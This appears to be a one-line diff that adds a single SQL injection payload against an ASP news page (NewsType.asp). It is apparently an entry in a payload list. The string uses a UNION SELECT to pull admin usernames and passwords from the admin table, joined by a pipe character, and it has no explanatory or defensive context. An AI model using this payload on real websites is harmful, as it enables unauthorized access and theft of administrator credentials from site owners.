@@ -1,0 +1,1 @@
+NewsType.asp?SmallClass=' union select 0,username+CHR(124)+password,2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and ''='
